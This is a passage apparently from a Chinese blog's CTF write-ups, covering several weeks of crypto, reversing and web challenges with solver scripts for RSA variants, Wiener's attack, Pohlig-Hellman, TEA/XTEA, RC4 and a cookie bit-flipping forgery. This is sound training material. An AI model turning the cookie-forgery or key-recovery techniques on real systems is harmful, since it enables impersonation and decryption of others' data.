114, 228, 7, 4, 116, 95, 0],[57, 51, 70, 88, 35, 71, 211, 49, 24, 185, 59, 42, 194, 134, 138, 28, 71, 180, 33, 5, 241, 43, 236, 158, 175, 177, 112, 246, 230, 16, 66, 61, 0],[51, 50, 76, 35, 23, 188, 157, 11, 218, 7, 194, 137, 234, 191, 90, 37, 88, 66, 90, 219, 194, 207, 207, 123, 175, 90, 46, 37, 36, 138, 79, 141, 0],[50, 0, 53, 192, 79, 171, 82, 229, 125, 57, 175, 110, 221, 223, 135, 230, 80, 12, 84, 236, 24, 159, 162, 138, 192, 115, 14, 241, 136, 167, 126, 191, 0],[99, 6, 7, 94, 175, 168, 56, 162, 153, 32, 51, 47, 255, 227, 128, 22, 9, 59, 179, 220, 67, 35, 55, 67, 154, 50, 190, 172, 202, 60, 142, 15, 0],[50, 253, 67, 15, 130, 224, 118, 208, 216, 74, 250, 158, 189, 128, 131, 234, 26, 228, 80, 73, 86, 160, 97, 78, 45, 122, 133, 5, 198, 66, 0, 81, 0],[99, 4, 199, 224, 148, 39, 238, 96, 119, 6, 176, 228, 224, 54, 141, 123, 141, 205, 218, 173, 55, 31, 221, 60, 178, 84, 23, 89, 167, 154, 32, 239, 0],[45, 85, 46, 122, 244, 68, 116, 34, 221, 138, 55, 75, 226, 97, 189, 148, 221, 52, 1, 248, 114, 176, 8, 176, 26, 36, 254, 105, 69, 18, 211, 41, 0],[101, 178, 171, 214, 220, 2, 252, 196, 206, 240, 3, 179, 155, 137, 89, 251, 195, 165, 31, 103, 255, 45, 55, 187, 204, 255, 224, 15, 24, 56, 247, 40, 0],[50, 167, 89, 9, 177, 43, 158, 16, 131, 179, 10, 177, 178, 98, 92, 135, 239, 151, 119, 123, 132, 163, 43, 170, 186, 147, 234, 115, 79, 252, 250, 116, 0],[49, 47, 171, 62, 5, 79, 38, 51, 70, 179, 85, 195, 162, 109, 18, 115, 65, 255, 34, 173, 238, 234, 193, 94, 249, 56, 171, 183, 67, 104, 147, 143, 0],[48, 182, 191, 237, 129, 215, 201, 124, 177, 149, 166, 73, 81, 94, 190, 166, 229, 200, 7, 13, 241, 135, 150, 46, 24, 109, 125, 164, 189, 69, 113, 109, 0],[45, 89, 205, 99, 88, 215, 11, 80, 243, 218, 100, 11, 212, 8, 92, 74, 252, 30, 55, 192, 73, 187, 174, 197, 57, 133, 249, 53, 53, 118, 22, 221, 0],[52, 71, 114, 128, 97, 67, 221, 133, 223, 61, 204, 205, 22, 51, 47, 172, 147, 32, 234, 199, 132, 146, 39, 66, 54, 97, 213, 12, 252, 176, 155, 133, 0],[99, 91, 143, 157, 168, 15, 86, 146, 41, 35, 117, 145, 136, 146, 81, 192, 135, 168, 225, 250, 37, 238, 3, 235, 127, 9, 183, 120, 97, 26, 183, 118, 0],[51, 209, 112, 133, 251, 162, 133, 59, 102, 54, 89, 253, 224, 242, 226, 39, 141, 248, 95, 118, 76, 242, 125, 36, 221, 76, 66, 138, 163, 152, 254, 16, 0],[57, 75, 17, 230, 10, 33, 201, 222, 216, 83, 174, 217, 170, 99, 135, 199, 85, 136, 224, 222, 2, 11, 50, 132, 117, 114, 148, 72, 226, 234, 171, 246, 0],[45, 141, 76, 225, 11, 86, 73, 123, 44, 167, 37, 118, 191, 218, 20, 104, 99, 192, 93, 210, 67, 247, 76, 73, 189, 97, 149, 170, 176, 63, 153, 43, 0],[57, 28, 94, 79, 112, 54, 103, 40, 164, 14, 49, 218, 124, 41, 96, 50, 203, 166, 60, 116, 145, 68, 248, 118, 174, 221, 205, 220, 135, 41, 163, 168, 0],[102, 13, 169, 15, 143, 157, 177, 226, 71, 32, 137, 29, 19, 104, 206, 91, 236, 32, 229, 64, 41, 47, 254, 18, 155, 63, 128, 100, 66, 162, 193, 241, 0],[98, 146, 73, 198, 122, 166, 80, 102, 117, 225, 228, 13, 193, 84, 12, 52, 140, 30, 240, 34, 78, 31, 18, 41, 44, 26, 9, 204, 225, 147, 139, 128, 0],[53, 14, 133, 195, 168, 64, 224, 180, 160, 82, 211, 95, 45, 59, 129, 26, 169, 179, 13, 14, 26, 119, 166, 17, 115, 24, 245, 177, 230, 236, 94, 78, 0],[45, 77, 241, 7, 198, 249, 57, 27, 170, 144, 156, 65, 59, 112, 61, 220, 233, 36, 245, 25, 156, 60, 125, 253, 162, 93, 89, 211, 188, 138, 77, 175, 0],[97, 120, 20, 25, 115, 128, 156, 160, 33, 225, 56, 240, 13, 201, 153, 172, 67, 177, 220, 201, 41, 74, 106, 103, 109, 218, 89, 60, 161, 83, 131, 114, 0],[55, 98, 158, 72, 246, 217, 109, 43, 255, 4, 185, 21, 41, 16, 142, 110, 199, 31, 71, 50, 73, 155, 223, 146, 204, 116, 102, 2, 127, 207, 100, 70, 0],[102, 110, 39, 119, 128, 82, 88, 94, 222, 216, 189, 122, 119, 52, 112, 190, 130, 236, 189, 162, 21, 82, 156, 97, 209, 117, 3, 10, 241, 135, 225, 188, 0],[51, 56, 29, 56, 160, 107, 128, 109, 215, 223, 53, 188, 73, 1, 60, 143, 56, 251, 222, 114, 85, 5, 165, 232, 74, 179, 223, 42, 248, 70, 176, 214, 0],[53, 14, 200, 21, 99, 25, 26, 197, 121, 232, 54, 53, 126, 71, 114, 159, 147, 171, 153, 44, 161, 164, 65, 235, 64, 125, 59, 161, 243, 60, 59, 211, 0],[101, 169, 64, 184, 197, 200, 142, 71, 216, 76, 167, 80, 153, 30, 135, 187, 233, 116, 225, 217, 198, 245, 83, 207, 191, 79, 154, 81, 200, 230, 28, 72, 0],[56, 214, 60, 99, 0, 9, 224, 56, 153, 174, 115, 156, 76, 48, 213, 148, 0, 65, 150, 225, 189, 206, 45, 1, 59, 96, 186, 250, 140, 126, 94, 71, 0],[54, 112, 114, 55, 215, 153, 61, 102, 227, 233, 50, 255, 57, 209, 189, 51, 34, 194, 31, 173, 212, 85, 96, 43, 115, 251, 142, 150, 139, 58, 88, 113, 0]]def getFlag(testM): flag='' i=j=0 while testM[i][j]!=0: flag+=chr(testM[i][j]) if i==len(testM)-1: i=0 j+=1 else: i+=1 print(flag)getFlag(flag) 签到得到一串类似base32的字符串，直接解码失败，进行凯撒移位爆破，得到flag 123456789101112import base64a='ZMJTPM33TR3GXMEITH4QNAOLTIFQTLMLTNMQRBQOZIDJXLEDZEGQNLEDT42U2==='for i in range(26): tmp='' for j in range(len(a)-3): if a[j].isupper(): tmp+=chr((ord(a[j])-ord('A')+i)%26+ord('A')) else: tmp+=a[j] tmp+=a[-3:] print(tmp) print(base64.b32decode(tmp))","link":"/2022/09/06/%E7%BE%8A%E5%9F%8E%E6%9D%AFwp/"},{"title":"","text":"太菜了还是，好多不会 Week1CryptoRSA12345678910import gmpy2from Crypto.Util.number import long_to_bytesc=110674792674017748243232351185896019660434718342001686906527789876264976328686134101972125493938434992787002915562500475480693297360867681000092725583284616353543422388489208114545007138606543678040798651836027433383282177081034151589935024292017207209056829250152219183518400364871109559825679273502274955582n=135127138348299757374196447062640858416920350098320099993115949719051354213545596643216739555453946196078110834726375475981791223069451364024181952818056802089567064926510294124594174478123216516600368334763849206942942824711531334239106807454086389211139153023662266125937481669520771879355089997671125020789f1=11239134987804993586763559028187245057652550219515201768644770733869088185320740938450178816138394844329723311433549899499795775655921261664087997097294813f2=12022912661420941592569751731802639375088427463430162252113082619617837010913002515450223656942836378041122163833359097910935638423464006252814266959128953e=65537phi=(f1-1)*(f2-1)d=gmpy2.invert(e,phi)print(long_to_bytes(pow(c,d,n))) Reversetest your IDAIDA打开即可 easyasm12345enc=[0x5b,0x54,0x52,0x5e,0x56,0x48,0x44,0x56,0x5f,0x50,0x3,0x5e,0x56,0x6c,0x47,0x3,0x6c,0x41,0x56,0x6c,0x44,0x5c,0x41,0x2,0x57,0x12,0x4e]flag=''for i in range(len(enc)): flag+=chr((enc[i]^0x33))print(flag) easyenc123456789101112131415enc=[ 0x04, 0xFF, 0xFD, 0x09,0x01, 0xF3, 0xB0, 0x00,0x00, 0x05, 0xF0, 0xAD,0x07, 0x06, 0x17, 0x05,0xEB, 0x17, 0xFD, 0x17,0xEA, 0x01, 0xEE, 0x01,0xEA, 0xB1, 0x05, 0xFA,0x08, 0x01, 0x17, 0xAC,0xEC, 0x01, 0xEA, 0xFD,0xF0, 0x05, 0x07, 0x06,0xF9]flag=''for i in enc: flag+=chr(((i+86)%256)^0x32)print(flag) a_cup_of_tea123456789101112131415161718192021#include &lt;stdio.h&gt;#include &lt;string.h&gt;int main(){ unsigned int enc[]={0x2E63829D,0xC14E400F,0x9B39BFB9,0x5A1F8B14,0x61886DDE,0x6565C6CF,0x9F064F64,0x236A43F6,0x7D6B},enc1,enc0; int i,j; for(j=0;j&lt;4;j++){ int sum=-0x543210DD*32; enc1=enc[2*j+1]; enc0=enc[2*j]; for(i=0;i&lt;32;i++){ enc1 -= (sum + enc0) ^ ((enc0 &gt;&gt; 5) + 1164413185) ^ (16 * (enc0 + 54880137)); enc0 -= (sum + enc1) ^ (16 * enc1 + 305419896) ^ ((enc1 &gt;&gt; 5) + 591751049); sum+=0x543210DD; } enc[2*j]=enc0; enc[2*j+1]=enc1; } printf(&quot;%s&quot;,enc);} encode12345678910111213141516171819202122code =[0x08, 0x06, 0x07, 0x06, 0x01, 0x06, 0x0D, 0x06, 0x05, 0x06, 0x0B, 0x07, 0x05, 0x06, 0x0E, 0x06, 0x03, 0x06, 0x0F, 0x06, 0x04, 0x06, 0x05, 0x06, 0x0F, 0x05, 0x09, 0x06,0x03, 0x07, 0x0F, 0x05, 0x05,0x06, 0x01, 0x06, 0x03, 0x07,0x09, 0x07, 0x0F, 0x05, 0x06, 0x06, 0x0F, 0x06, 0x02, 0x07, 0x0F, 0x05, 0x01, 0x06, 0x0F, 0x05, 0x02, 0x07, 0x05, 0x06, 0x06, 0x07, 0x05, 0x06, 0x02, 0x07, 0x03, 0x07, 0x05, 0x06,0x0F, 0x05, 0x05, 0x06, 0x0E, 0x06, 0x07, 0x06, 0x09, 0x06, 0x0E, 0x06, 0x05, 0x06, 0x05, 0x06, 0x02, 0x07, 0x0D, 0x07, 0x00]flag=''for i in range(len(code)//2): flag+=chr((code[2*i+1]&lt;&lt;4)+code[2*i])print(flag) Week2CryptoRabin123456789from ECC_algorithm import getSquareRootfrom Algorithm import crtfrom Crypto.Util.number import long_to_bytesp=65428327184555679690730137432886407240184329534772421373193521144693375074983q=98570810268705084987524975482323456006480531917292601799256241458681800554123c=0x4e072f435cbffbd3520a283b3944ac988b98fb19e723d1bd02ad7e58d9f01b26d622edea5ee538b2f603d5bf785b0427de27ad5c76c656dbd9435d3a4a7cf556m1=-getSquareRoot(c%p,p)m2=-getSquareRoot(c%q,q)print(long_to_bytes(crt([m1,m2],[p,q]))) RSA大冒险123456789101112131415161718192021222324252627282930313233343536373839import gmpy2from Crypto.Util.number import long_to_bytesimport Algorithm#1n=315288933426825805688924212616592252450801238550920201591728485170037832236185293620562262212564373e=65537p=221529464269769759349693179557659241103c=0x6702f40be3f2e1b6fc5ea06d1b000c4ebde5157c02889b9300b69b2d45f284d606bae84abf968f01b0qr=n//pm=pow(c,gmpy2.invert(e,p-1),p)print(pow(m,65537,n)==c)print(long_to_bytes(m))# #2# n=74788398255452600833006995275667385156303318208066703845018835899047541642249211631956818572743022514771471375982167772084425103038607252133106634140832610528192419686108005225277276397797407210527604431131466170506864385585497721578313293000470724782979508268306801922949301532872265907827352070517986364579# e=65537# c=0x32f90a5496b4f1817094872336ed76890d120482a98f36393adce3d54da04b1a6932431b65c02320aba2a699f3f5a5814df7250c97797e490e4037d2575162a15e68176bcd6b1449263926e59cdb4083d5afe83ec8f0f4ebd68c0c40a290d5aec10aa03e8de371ae5eb29e4596f7b76d80e394fa515153ca007c542036b03f20# n2=58291586270230855897847847464314004515356512090345158708849343859273898424491767757290988474773509629354082311175934200369087232429477787414958311627584959811148715414337981686730592018183488550424748798531109668152822563183050998595456519309548963205798500341294941359987406623878029149035264590916561097653# p=gmpy2.gcd(n,n2)# q=n//p# phi=(p-1)*(q-1)# print(long_to_bytes(pow(c,gmpy2.invert(e,phi),n)))# 3# n=57687805569573540814501334034329540619143973581288688414392180201360033962712440711890754667066506418270714008773288876051561737321648338390525811201806376049977473269236021141765756076756805005067881537548979911007527752944881304359954277998811753011700542606798148300649170003618913089646022889478178689127# e=3# c=0xfec61958cefda3eb5f709faa0282bffaded0a323fe1ef370e05ed3744a2e53b55bdd43e9594427c35514505f26e4691ba86c6dcff6d29d69110b15b9f84b0d8eb9ea7c03aaf24fa957314b89febf46a615f81ec031b12fe725f91af9d269873a69748# print(long_to_bytes(gmpy2.iroot(c,3)[0]))# 4# n=116386008425495406244066638160981699371298928874789571584702923577353414603674936565315161353810919339954009847771804025309209778770922543381030674180320647299711643763256427360268926786148664562727195227099859778200572178703215056598179424866307970709766530478522276413248639226003427624992695339403720611521# e1=77983# c1=0x9c4e31c63e8c42ceab4b91f6cab3808b7d9c278a8e1a7fbe281c13db2efeb501e25eae6369c5643240ac3cede109ec2bbe42967b297405b170eaa731b3aa962bdfce5b8ac35ad9c381474fa1b07a332c1e2e0cf652d6d3f49f3b0bbb024c6a2cf63ecd64935b55a752357f62e1a335f105299702738b2816d86eb0d1ffd79ee3# e2=82729# c2=0x6981244f3403c0b78eec867cb8713cb73a6acaffbbd9a18e7459831f58f8cc426c67de03272e1824734b45674c28ede6190bb3e14430d4d5be7a6f22e78236cd4c7ed5836461177602730c99ce5f074b8eeb9e3d537635d380264d3c599ca1c2c7ddf9fb43004b20eed8a6cb31ea4fd29625f88c4e1c5436fcd323b8570444b7# g,a,b=Algorithm.expand_gcd(e1,e2)# m=pow(c1,a,n)*gmpy2.invert(pow(c2,-b,n),n)%n# print(long_to_bytes(m)) 包里有什么背包密码 1234567891011121314151617181920import gmpy2from Crypto.Util.number import long_to_bytesm = 1528637222531038332958694965114330415773896571891017629493424b0 = 69356606533325456520968776034730214585110536932989313137926c = 93602062133487361151420753057739397161734651609786598765462162w=b0//2l = m.bit_length()-1a = [2 &lt;&lt; i for i in range(l)]flag=''c=c*gmpy2.invert(w,m)%mfor i in range(len(a),-1,-1): if c&gt;=(2&lt;&lt;i): flag+='1' c-=(2&lt;&lt;i) else: flag+='0'flag=flag[::-1]+'000000'print(long_to_bytes(int(flag,2))) 零元购年货商店在页面上尝试输入两次用户名abc和def，F12获取相应的cookie，发现二者近似 12345678910111213import base64s_def='kiHbrnsPwBI7zoV240jWtM3do4tvm9wL+XbrCtC2+ZywtGXQEaNKlhkz7NvZQQtufojxHoY='s_abc='kiHbrnsPwBI7y4Jz40jWtM3do4tvm9wL+XbrCtC2+Z23sWXQEaNKlhkz7NvZQQtufojxHoY='s_xyz='kiHbrnsPwBI70plq40jWtM3do4tvm9wL+XbrCtC2+ZGytWXQEaNKlhkz7NvZQQtufojxHoY='s_abc=base64.b64decode(s_abc)s_def=base64.b64decode(s_def)s=[]for i in range(len(s_abc)): s.append(s_abc[i]^s_def[i])print(s)print(ord('a')^ord('d'))print(ord('b')^ord('e'))print(ord('c')^ord('f')) 做异或发现只有部分不一样，且异或不相同的部分与原文异或不相同的结果一样，猜测每次异或的密文都相同 结合阅读源码，我们只需要修改Name域，令其异或后解密的结果为Vidar-Tu即可 123456789101112131415161718192021import base64from Crypto.Util.number import long_to_bytesss2='+EuQ73NUGxuMfxlZhWZUCJvEuLx7C6GTPsPorqxH6tFgkLVq6COXSI9Xu9z8sKqbFXlvB0rPH8Aq5w=='ss1='+EuQ73NUGxuMfBpahmVXC5jEuLx7C6GTPsPorqxH6tFgkLVq6yqdSI9Xu9z8sKqbFXlvB0rPH8Aq5w=='name='Vidar-Tu'fake='11111111'a=base64.b64decode(ss1)print(a)s=[]for i in range(len(a)): s.append(a[i])for i in range(9,17): s[i]^=ord('1') s[i]^=ord(name[i-9])flag=b''for i in s: flag+=long_to_bytes(i)print(base64.b64encode(flag)) 注意修改的时候要URLencode Reversebefore_main在此处找到了真正的码表 1234567891011121314from libnum import n2ss='AMHo7dLxUEabf6Z3PdWr6cOy75i4fdfeUzL17kaV7rG='def base64_decode(string): table='qaCpwYM2tO/RP0XeSZv8kLd6nfA7UHJ1No4gF5zr3VsBQbl9juhEGymc+WTxIiDK' result='' for i in string: print(i) if i!='=': index=table.index(i) result+=(bin(index)[2:]).zfill(6) elif i=='=': result=result[:-2] return n2s(int(result,2))print(base64_decode(s)) streampython反编译，用pyinstxtractor，搞出pyc后拖进python反编译 - 在线工具 (tool.lu) 1234567891011121314151617181920212223242526272829303132333435363738394041#!/usr/bin/env python# visit https://tool.lu/pyc/ for more information# Version: Python 3.9import base64def gen(key): s = list(range(256)) j = 0 for i in range(256): j = (j + s[i] + ord(key[i % len(key)])) % 256 tmp = s[i] s[i] = s[j] s[j] = tmp i = j = 0 data = [] for _ in range(50): i = (i + 1) % 256 j = (j + s[i]) % 256 tmp = s[i] s[i] = s[j] s[j] = tmp data.append(s[(s[i] + s[j]) % 256]) return datadef encrypt(text, key): result = '' for c, k in zip(text, gen(key)): result += chr(ord(c) ^ k) result = base64.b64encode(result.encode()).decode() return resulttext = input('Flag: ')key = 'As_we_do_as_you_know'enc = encrypt(text, key)if enc == 'wr3ClVcSw7nCmMOcHcKgacOtMkvDjxZ6asKWw4nChMK8IsK7KMOOasOrdgbDlx3DqcKqwr0hw701Ly57w63CtcOl': print('yes!') return NoneNone('try again...') 明显是rc4流密码，脚本弄出来的缩进不太对，还得调一下 12345678910111213141516171819202122232425262728293031from Crypto.Util.number import long_to_bytes,bytes_to_longimport base64def gen(key): s = list(range(256)) j = 0 for i in range(256): j = (j + s[i] + ord(key[i % len(key)])) % 256 tmp = s[i] s[i] = s[j] s[j] = tmp i = j = 0 data = [] for _ in range(50): i = (i + 1) % 256 j = (j + s[i]) % 256 tmp = s[i] s[i] = s[j] s[j] = tmp data.append(s[(s[i] + s[j]) % 256]) return datadef encrypt(text, key): result = '' for c, k in zip(text, gen(key)): result += chr(ord(c) ^ k) return resultenc='wr3ClVcSw7nCmMOcHcKgacOtMkvDjxZ6asKWw4nChMK8IsK7KMOOasOrdgbDlx3DqcKqwr0hw701Ly57w63CtcOl'key='As_we_do_as_you_know'print(encrypt(base64.b64decode(enc).decode(),key)) VidarCamera拖进去，发现要输入序列号 在onCreate处发现序列号的逻辑 随后找到加密逻辑 类似XTea的加密，只不过要注意加密轮数为33论，且括号要处理 123456789101112131415161718#include &lt;stdio.h&gt;#include &lt;string.h&gt;int main(){ unsigned int iArr[]={637666042,457511012,-2038734351,578827205,-245529892,-1652281167,435335655,733644188,705177885,-596608744,0}; unsigned int r1[]={2233,4455,6677,8899}; int i2,i3,i4,j; for(i2=8;i2&gt;=0;i2--){ i4=878077251*33; for(i3=32;i3&gt;=0;i3--){ i4-=878077251; iArr[i2+1]-= ((((iArr[i2] &lt;&lt; 4) ^ (iArr[i2] &gt;&gt; 5)) + iArr[i2]) ^ ((r1[(i4 &gt;&gt; 11) &amp; 3]) + i4)); iArr[i2]-= (((((r1[i4 &amp; 3]) + i4) ^ (((iArr[i2+1] &lt;&lt; 4) ^ ((iArr[i2+1]) &gt;&gt; 5)) + iArr[i2+1])) ^ i4)); } } printf(&quot;%s&quot;,iArr);} math懒得看了，angr跑一会搞定 1234567891011121314151617181920212223242526272829303132import angrimport sysdef main(argv): path_to_binary = 'math' # :string project = angr.Project(path_to_binary) initial_state = project.factory.entry_state() simulation = project.factory.simgr(initial_state,veritesting = True) def is_good(state): return b'yes!' in state.posix.dumps(1) def is_bad(state): return b'no no' in state.posix.dumps(1) simulation.explore(find=is_good,avoid=is_bad) if simulation.found: solution_state = simulation.found[0] print(solution_state.posix.dumps(sys.stdin.fileno())) else: raise Exception('Could not find the solution')if __name__ == '__main__': main(sys.argv) Week3CryptoezBlock简单的差分 1234567891011121314151617181920212223242526272829303132m_list = [i * 0x1111 for i in range(16)]c_list=[28590, 33943, 30267, 5412, 11529, 3089, 46924, 59533, 12915, 37743, 64090, 53680, 18933, 49378, 23512, 44742]s_box = {0: 0x6, 1: 0x4, 2: 0xc, 3: 0x5, 4: 0x0, 5: 0x7, 6: 0x2, 7: 0xe, 8: 0x1, 9: 0xf, 10: 0x3, 11: 0xd, 12: 0x8, 13: 0xa, 14: 0x9, 15: 0xb}num=0for j in range(4): result=[] for i in range(len(c_list)): possible=[] for i1 in range(16): for i2 in range(16): for i3 in range(16): for i4 in range(16): for i5 in range(16): tmp=(m_list[i]&gt;&gt;(4*j))&amp;0xf tmp^=i1 tmp=s_box[tmp] tmp^=i2 tmp=s_box[tmp] tmp^=i3 tmp=s_box[tmp] tmp^=i4 tmp=s_box[tmp] tmp^=i5 if tmp==(c_list[i]&gt;&gt;(4*j))&amp;0xf: possible.append((i1,i2,i3,i4,i5)) result.append(possible) f=result[0] for i in range(1,16): f=list(set(set(f)).intersection(result[i])) print(f) 12345678910111213141516171819r1=[(2, 3, 2, 0, 5)]r2=[(4, 9, 9, 7, 13)]r3=[(15, 4, 15, 5, 8)]r4=[(4, 15, 4, 4, 13)]flag=''for i1 in r1: for i2 in r2: for i3 in r3: for i4 in r4: flag=(hex(i4[0])[2:]+hex(i3[0])[2:]+hex(i2[0])[2:]+hex(i1[0])[2:]) flag+='_' flag+=(hex(i4[1])[2:]+hex(i3[1])[2:]+hex(i2[1])[2:]+hex(i1[1])[2:]) flag+='_' flag+=(hex(i4[2])[2:]+hex(i3[2])[2:]+hex(i2[2])[2:]+hex(i1[2])[2:]) flag+='_' flag+=(hex(i4[3])[2:]+hex(i3[3])[2:]+hex(i2[3])[2:]+hex(i1[3])[2:]) flag+='_' flag+=(hex(i4[4])[2:]+hex(i3[4])[2:]+hex(i2[4])[2:]+hex(i1[4])[2:]) print(flag) ezDH题目描述 12345678910111213141516171819202122232425262728293031from sage.all import *from Crypto.Util.number import *from secret import Alice_secret, Bob_secret, FLAGimport randomf = open('output', 'w')N=0x2be227c3c0e997310bc6dad4ccfeec793dca4359aef966217a88a27da31ffbcd6bb271780d8ba89e3cf202904efde03c59fef3e362b12e5af5afe8431cde31888211d72cc1a00f7c92cb6adb17ca909c3b84fcad66ac3be724fbcbe13d83bbd3ad50c41a79fcdf04c251be61c0749ea497e65e408dac4bbcb3148db4ad9ca0aa4ee032f2a4d6e6482093aa7133e5b1800001g = 2A = power_mod(g, Alice_secret, N)f.write(&quot;Alice send to Bob: {{ 'g': {g}, 'A': {A} }}\\n&quot;.format(g=g, A=hex(A)))B = power_mod(g, Bob_secret, N)f.write(&quot;Bob send to Alice: {{'B': {B} }}\\n&quot;.format(B=hex(B)))shared_secret = pow(A, Bob_secret, N)p=6864797660130609714981900799081393217269435300143305409394463459185543183397656052122559640661454554977296311391480858037121987999716643812574028291115057151a=-3b=1093849038073734274511112390766805569936207598951683748994586394495953116150735016013708737573759623248592132296706313309438452531591012912142327488478985984E = EllipticCurve(GF(p), [a, b])G = E.random_point()Pa = shared_secret * Gf.write(f&quot;Alice send to Bob: {{ 'E': {E}, 'G': {G.xy()}, 'Pa': {Pa.xy()} }}\\n&quot;)k = random.randint(2, p)m = E.lift_x(Integer(bytes_to_long(FLAG)))P1 = k * GP2 = k * Pac = m + P2f.write(f&quot;Bob send to Alice: {{ {P1.xy()}, {c.xy()} }}\\n&quot;) 可以注意到N-1有较多小因子，可以使用Pohlig-Hellman方法来求得离散对数，然后解ECC即可 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061from Crypto.Util.number import long_to_bytesdef babystep_giantstep(g, y, p, q=None): if q is None: q = p - 1 m = int(q**0.5 + 0.5) # Baby step table = {} gr = 1 # g^r for r in range(m): table[gr] = r gr = (gr * g) % p # Giant step try: gm = pow(g, -m, p) # gm = g^{-m} except: return None ygqm = y # ygqm = y * g^{-qm} for q in range(m): if ygqm in table: return q * m + table[ygqm] ygqm = (ygqm * gm) % p return None# Pohlig–Hellman法def pohlig_hellman_DLP(g, y, p): crt_moduli = [] crt_remain = [] for q, q2 in factor(p-1): # print(q,q2) x = babystep_giantstep(pow(g,(p-1)//(q**q2),p), pow(y,(p-1)//(q**q2),p), p, q**q2) if (x is None) or (x &lt;= 1): continue crt_moduli.append(q**q2) crt_remain.append(x) x = crt(crt_remain, crt_moduli) return xprint('start')p=0x2be227c3c0e997310bc6dad4ccfeec793dca4359aef966217a88a27da31ffbcd6bb271780d8ba89e3cf202904efde03c59fef3e362b12e5af5afe8431cde31888211d72cc1a00f7c92cb6adb17ca909c3b84fcad66ac3be724fbcbe13d83bbd3ad50c41a79fcdf04c251be61c0749ea497e65e408dac4bbcb3148db4ad9ca0aa4ee032f2a4d6e6482093aa7133e5b1800001g = 2y=0x22888b5ac1e2f490c55d0891f39aab63f74ea689aa3da3e8fd32c1cd774f7ca79538833e9348aebfc8eba16e850bbb94c35641c2e7e7e8cb76032ad068a83742dbc0a1ad3f3bef19f8ae6553f39d8771d43e5f2fcb986bd72459456d073e70d5be4d79ce5f10f76edea01492f11b807ebff0faf6819d62a8e972084e1ed5dd6e0152df2b0477a42246bbaa04389abf639833x = pohlig_hellman_DLP(g, y, p)print(x)print(pow(g, x, p) == y)x=763298723297979584226242509265452306429639396521052028233101832019494785232399729271964221388376632821010862649548789429670851057375901795855235180313900741161592403349942229366915608459286246948319221523754683611262962342297848271246140638750634713429329336679437505962986861155545101512718349115470005425527433246034761B=0x1889c9c65147470fdb3ad3cf305dc3461d1553ee2ce645586cf018624fc7d8e566e04d416e684c0c379d5819734fd4a09d80add1b3310d76f42fcb1e2f5aac6bcdd285589b3c2620342deffb73464209130adbd3a444b253fc648b40f0acec7493adcb3be3ee3d71a00a2b121c65b06769aada82cd1432a6270e84f7350cd61dddc17fe14de54ab436f41b9c9a0430510ddeshared_secret=int(pow(B,x,p))p=6864797660130609714981900799081393217269435300143305409394463459185543183397656052122559640661454554977296311391480858037121987999716643812574028291115057151a=-3b=1093849038073734274511112390766805569936207598951683748994586394495953116150735016013708737573759623248592132296706313309438452531591012912142327488478985984E = EllipticCurve(GF(p), [a, b])G = (6205877918333770287323403670543661734129170085954198767820861962261174202646976379181735257759867760655835711845144326470613882395445975482219869828210975915, 3475351956909044812130266914587199895248867449669290021764126870271692995160201860564302206748373950979891071705183465400186006709376501382325624851012261206)G=E(G)Pa = shared_secret * GP1=(2032638959575737798553734238953177065671021112450002471824225734491735604600003028491729131445734432442510201955977472408728415227018746467250107080483073647, 3510147080793750133751646930018687527128938175786714269902604502700248948154299853980250781583789623838631244520649113071664767897964611902120411142027848868)P2=(6670373437344180404127983821482178149374116817544688094986412631575854021385459676854475335068369698875988135009698187255523501841013430892133371577987480522, 6648964426034677304189862902917458328845484047818707598329079806732346274848955747700716101983207165347315916182076928764076602008846695049181874187707051395)P1=E(P1)P2=E(P2)m=P2-P1*shared_secretprint(long_to_bytes(m[0])) RSA大冒险2challenge1简单的维纳攻击 1234567891011121314151617181920212223242526272829303132from Crypto.Util.number import long_to_bytesimport gmpy2def factor_rsa_wiener(N, e): N = Integer(N) e = Integer(e) cf = (e / N).continued_fraction().convergents() for f in cf: k = f.numer() d = f.denom() if k == 0: continue phi_N = ((e * d) - 1) / k b = -(N - phi_N + 1) dis = b ^ 2 - 4 * N if dis.sign() == 1: dis_sqrt = sqrt(dis) p = (-b + dis_sqrt) / 2 q = (-b - dis_sqrt) / 2 if p.is_integer() and q.is_integer() and (p * q) % N == 0: p = p % N q = q % N if p &gt; q: return (p, q) else: return (q, p)N=50106912620790723077748545370285638630293798103987564459024942397537915131654086715100716388428657018919266434631236880898382514286620710831685926262188628898376237809812120429079356974374541030002893395714637757523689802947777409958739773609927095021686448707688630552930512877986543894720890402942033640883e=41075178854133592024776262333088701478668890936237383929396694707270483948075119748561904376352154940688225339329231162485943249496993086276241801696944674829482261958846118393348915882539764746235942568552117626057958336132194103496781938903334500301844279687108418200811794859771282626848838075104652072619c=0x35799c3c06aefd5f975953c146a508e271d6df17da9de372778ecc05beb3abc65be705196e5b3513e79b221c54061b2d099c6b546926fd7a812f92527a5a1184b07ca3d75cee8f8781fc11e4d7aec60f25085dc1cdd0a86336f9ed06911954a5622ee7a622200bdaa18008a50f7d6bd465bfdf655d106201180a6e9733360c2fp,q=factor_rsa_wiener(N,e)d=gmpy2.invert(e,(p-1)*(q-1))print(long_to_bytes(pow(c,d,N))) challenge2challenge3Week4CryptoLLLCG忘加括号，导致随机数发生器所产生的数越来越大，去输出的最后两个数相除即可 1234from Crypto.Util.number import *ab=2210339415803634038733110355745541789857097874150036841255120171762841025589598926352543605619033424326732572701077344406169559978619312579944880275039447541362550823548193938390595424472482283938134706652964035996074021101163520026028471816769406746547205039247924449981177497483419697277664998996901572127319728001322396904504118696436628530032725931252935112418208487069373821155939854041330301007951013255288385835004738736281973036005405810141085798500100515625540100681105919989328168131955984549143274206618922200409387620168283300278493433215060551923871955149734908482240827741261637463048197397783387051784256925167575243401643588323336939808587106958740516979530750116537006075931456339322694435257389595694703463686393123036706636512945038643811451204590352035215549689204272618879978738053831098144371148869867492682620768962263535659941591634014955911952791234611456385154591037995723797877101415568938413050014882041356377005554503162290542158858181090231088748089815786005204145984055612210549346471740909642287727003136065124656106117147315817289225383526041753673905695774638832193744810754436204004098990356702157071796152857713377486003144169904410039078715685688823909624304043446104742796803430659390907083819240823814230214986409700774790769096817346523086042658962576012426691078408300874796654476906578528861098254029682342576151493780101284836441514272522164597678378929970786873929932129051923212779372112696097338569838058069461914703273483151222691069446586952638002866453137122813418433426328311934991856259451478073651474142930487149605915647301572739170266624946109181045150432100853737210027922482909964637266004321709946725199265042950164006698591194081750518487052939793812415753096799080017097194158471348171965369917839539536364366405457876155804597125923308233817582616296909262833694806405799798218806091539849949120687415222191199445390566303290790965204308655003069852152395721766420654843822112601212949466039458786620414871460710966383